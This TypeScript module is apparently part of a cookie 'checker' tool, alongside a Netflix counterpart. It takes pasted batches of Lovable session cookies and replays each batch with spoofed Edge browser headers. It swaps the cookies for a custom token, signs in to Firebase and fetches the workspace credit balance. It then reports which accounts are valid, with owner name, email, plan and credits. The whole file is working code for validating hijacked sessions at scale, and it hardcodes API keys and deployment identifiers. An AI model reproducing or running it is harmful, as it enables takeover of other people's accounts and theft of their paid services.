import type { CookieBatch, CookieEntry, ValidationResult } from "~/lib/netflix.server";
import { formatBatchNetscape } from "~/lib/netflix.server";

const URL_CUSTOM_TOKEN = "https://lovable.dev/_serverFn/68ab599f4622afff956b6dfdaf9920e6f68f5c450e35985200cf48a309ce633b";
const FIREBASE_API_KEY = "AIzaSyBQNjlw9Vp4tP4VVeANzyPJnqbG2wLbYPw";
const URL_FIREBASE = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${FIREBASE_API_KEY}`;
const URL_CREDIT_BALANCE = "https://api.lovable.dev/workspaces/{workspace_id}/credit-balance";

const LOVABLE_HEADERS = {
  accept: "application/x-tss-framed, application/x-ndjson, application/json",
  "accept-language": "fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
  origin: "https://lovable.dev",
  referer: "https://lovable.dev/settings/billing",
  "sec-ch-ua": '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-origin",
  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
  "x-deployment-id": "645e2ac517c05a4b6dae331084cb9e8c3d010d1af95ed37819528e72618504c9",
  "x-tsr-serverfn": "true",
  priority: "u=1, i",
} as const;

const FIREBASE_HEADERS = {
  accept: "*/*",
  "accept-language": "fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
  "content-type": "application/json",
  origin: "https://lovable.dev",
  "sec-ch-ua": '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "cross-site",
  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
  "x-client-version": "Chrome/JsCore/11.10.0/FirebaseCore-web",
  "x-firebase-gmpid": "1:288002387414:web:231da37c38c486ca814877",
  "x-firebase-locale": "fr",
  priority: "u=1, i",
} as const;

function decodeJwtPayload(token: string): Record<string, unknown> {
  if (!token || typeof token !== "string") return {};
  const parts = token.split(".");
  if (parts.length < 2) return {};
  const payload = parts[1].replace(/-/g, "+").replace(/_/g, "/");
  const padded = payload + "=".repeat((4 - (payload.length % 4)) % 4);
  try {
    const binary = atob(padded);
    let json = "";
    for (let i = 0; i < binary.length; i += 1) {
      json += `%${binary.charCodeAt(i).toString(16).padStart(2, "0")}`;
    }
    return JSON.parse(decodeURIComponent(json));
  } catch {
    return {};
  }
}

function parseCookieLine(line: string): CookieEntry[] {
  const value = line.trim();
  if (!value) return [];

  // Netscape export can contain comment lines starting with #, but the
  // HttpOnly-prefixed cookie lines use the special #HttpOnly_ marker and must
  // still be parsed. We only ignore ordinary comments, not HttpOnly cookies.
  if (value.startsWith("#") && !value.startsWith("#HttpOnly_")) return [];

  const normalized = value.startsWith("#HttpOnly_") ? value.slice("#HttpOnly_".length) : value;
  const fields = normalized.split("\t");
  if (fields.length >= 7) {
    return [{
      domain: fields[0] || ".lovable.dev",
      flag: fields[1] || "TRUE",
      path: fields[2] || "/",
      secure: String(fields[3] || "TRUE").toUpperCase() === "TRUE",
      expiry: fields[4] || "0",
      name: fields[5] || "",
      value: fields.slice(6).join("\t") || "",
    }];
  }

  const pairs = normalized.split(";").map((part) => part.trim()).filter(Boolean);
  const cookies: CookieEntry[] = [];
  for (const pair of pairs) {
    if (!pair.includes("=")) continue;
    const [name, ...rest] = pair.split("=");
    if (!name) continue;
    cookies.push({
      domain: ".lovable.dev",
      flag: "TRUE",
      path: "/",
      secure: true,
      expiry: "0",
      name: name.trim(),
      value: rest.join("=").trim(),
    });
  }
  return cookies;
}

export function parseLovableCookiesFromText(content: string): CookieBatch[] {
  const batches: CookieBatch[] = [];
  const blocks = content.replace(/\r/g, "").split(/\n\s*\n/).map((block) => block.trim()).filter(Boolean);

  if (!blocks.length) {
    const direct = content.replace(/\r/g, "").split("\n").flatMap((line) => parseCookieLine(line));
    if (direct.length) {
      batches.push({ index: 1, cookies: direct, rawLine: content.slice(0, 120) });
    }
    return batches;
  }

  for (const block of blocks) {
    const cookies = block
      .split("\n")
      .flatMap((line) => parseCookieLine(line))
      .filter((cookie) => !!cookie.name && !!cookie.value);

    if (cookies.length) {
      batches.push({
        index: batches.length + 1,
        cookies,
        rawLine: block.split("\n")[0]?.slice(0, 120) || block.slice(0, 120),
      });
    }
  }

  return batches;
}

function getWorkspaceId(cookies: Map<string, string>): string | null {
  const raw = cookies.get("lovable-workspace-id") || "";
  if (!raw) return null;
  if (raw.includes(":")) return raw.split(":", 2)[1] || raw;
  return raw;
}

async function getCustomToken(cookieHeader: string): Promise<{ token: string | null; error: string | null }> {
  const response = await fetch(URL_CUSTOM_TOKEN, {
    method: "POST",
    headers: { ...LOVABLE_HEADERS, Cookie: cookieHeader },
    body: "",
    redirect: "manual",
  });

  const raw = await response.json().catch(() => ({}));
  try {
    const kv = Object.fromEntries((raw?.p?.k || []).map((key: string, index: number) => [key, raw.p.v[index]]));
    const resultNode = kv?.result || {};
    if (resultNode?.t === 1 && typeof resultNode?.s === "string") {
      return { token: resultNode.s, error: null };
    }

    const errNode = kv?.error || {};
    if (errNode?.t === 25) {
      return {
        token: null,
        error: errNode?.s?.message?.s || errNode?.s?.message || "Erreur Lovable custom token",
      };
    }
    return { token: null, error: "Impossible de récupérer le custom token" };
  } catch {
    return { token: null, error: "Réponse Lovable non exploitable" };
  }
}

async function firebaseSignIn(customToken: string): Promise<{ idToken: string | null; error: string | null }> {
  const response = await fetch(URL_FIREBASE, {
    method: "POST",
    headers: FIREBASE_HEADERS,
    body: JSON.stringify({ token: customToken, returnSecureToken: true }),
  });
  const data = await response.json().catch(() => ({}));

  if (data?.idToken && typeof data.idToken === "string") {
    return { idToken: data.idToken, error: null };
  }

  return { idToken: null, error: data?.error?.message || `Firebase error ${response.status}` };
}

async function getCreditBalance(idToken: string, workspaceId: string, cookieHeader: string): Promise<{ data: Record<string, unknown> | null; error: string | null; status: number }> {
  const url = URL_CREDIT_BALANCE.replace("{workspace_id}", workspaceId);
  const nowMs = Date.now();

  const response = await fetch(url, {
    method: "GET",
    headers: {
      accept: "*/*",
      "accept-language": "fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
      authorization: `Bearer ${idToken}`,
      "content-type": "application/json",
      origin: "https://lovable.dev",
      referer: "https://lovable.dev/",
      "sec-ch-ua": '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
      "x-browser-session-id": "bsess_01m14sqwaxfeyt597z0h1n1dyb",
      "x-client-git-sha": "9eafcdf4eca3012df344934d114f0387198cbd47",
      "x-lov-platform": '{"platform":"web","version":"9eafcdf4eca3012df344934d114f0387198cbd47"}',
      "x-lovable-read-after": String(nowMs),
      priority: "u=1, i",
      Cookie: cookieHeader,
    },
    redirect: "follow",
  });

  const text = await response.text();
  let data: Record<string, unknown> | null = null;
  try {
    data = text ? JSON.parse(text) : null;
  } catch {
    data = null;
  }

  if (response.ok) {
    return { data, error: null, status: response.status };
  }

  return { data, error: text.slice(0, 500) || `HTTP ${response.status}`, status: response.status };
}

export async function validateLovableBatch(batch: CookieBatch): Promise<ValidationResult> {
  const base = {
    batchIndex: batch.index,
    netflixId: null,
    cookiesData: batch.cookies,
    netscapeFormat: formatBatchNetscape(batch.cookies),
  };

  const cookieMap = new Map<string, string>();
  for (const cookie of batch.cookies) {
    if (!cookie.name) continue;
    if (!cookieMap.has(cookie.name)) cookieMap.set(cookie.name, cookie.value);
  }

  const workspaceId = getWorkspaceId(cookieMap);
  const planFromCookie = cookieMap.get("lovable-workspace-plan") || null;
  const flagPlan = cookieMap.get("lovable-flag-plan") || "";
  const planFromFlag = (decodeJwtPayload(flagPlan)?.plan as string | undefined) || null;
  const sessionJwt = cookieMap.get("lovable-session-id-v2") || cookieMap.get("lovable-session-id") || cookieMap.get("lovable-session") || "";
  const sessionPayload = decodeJwtPayload(sessionJwt);
  const accountName = typeof sessionPayload.name === "string" ? sessionPayload.name : null;
  const email = typeof sessionPayload.email === "string" ? sessionPayload.email : null;
  const cookieHeader = batch.cookies.map((cookie) => `${cookie.name}=${cookie.value}`).join("; ");

  if (!sessionJwt) {
    return {
      ...base,
      isValid: false,
      message: "No session cookie — le cookie de session Lovable est absent. Ajoutez le cookie de session complet pour valider le compte.",
      accountInfo: {
        workspace_id: workspaceId,
        plan: planFromCookie || planFromFlag,
        name: accountName,
        email,
      },
    };
  }

  if (!workspaceId) {
    return {
      ...base,
      isValid: false,
      message: "Workspace Lovable introuvable dans les cookies",
      accountInfo: {
        plan: planFromCookie || planFromFlag,
        name: accountName,
        email,
      },
    };
  }

  const customToken = await getCustomToken(cookieHeader);
  if (!customToken.token) {
    return {
      ...base,
      isValid: false,
      message: customToken.error || "Custom token invalide",
      accountInfo: {
        workspace_id: workspaceId,
        plan: planFromCookie || planFromFlag,
        name: accountName,
        email,
      },
    };
  }

  const firebase = await firebaseSignIn(customToken.token);
  if (!firebase.idToken) {
    return {
      ...base,
      isValid: false,
      message: firebase.error || "Connexion Firebase impossible",
      accountInfo: {
        workspace_id: workspaceId,
        plan: planFromCookie || planFromFlag,
        name: accountName,
        email,
      },
    };
  }

  const decodedFirebase = decodeJwtPayload(firebase.idToken);
  const firebaseEmail = typeof decodedFirebase.email === "string" ? decodedFirebase.email : email;

  const credit = await getCreditBalance(firebase.idToken, workspaceId, cookieHeader);
  if (!credit.data || credit.status !== 200) {
    return {
      ...base,
      isValid: false,
      message: `Balance Lovable inaccessible (${credit.status})${credit.error ? ` — ${credit.error}` : ""}`,
      accountInfo: {
        workspace_id: workspaceId,
        plan: planFromCookie || planFromFlag,
        name: accountName,
        email: firebaseEmail,
      },
    };
  }

  return {
    ...base,
    isValid: true,
    message: `Compte Lovable valide - workspace ${workspaceId}`,
    accountInfo: {
      workspace_id: workspaceId,
      plan: planFromCookie || planFromFlag || "unknown",
      name: accountName,
      email: firebaseEmail,
      credits: credit.data,
      source: "lovable-api",
    },
  };
}
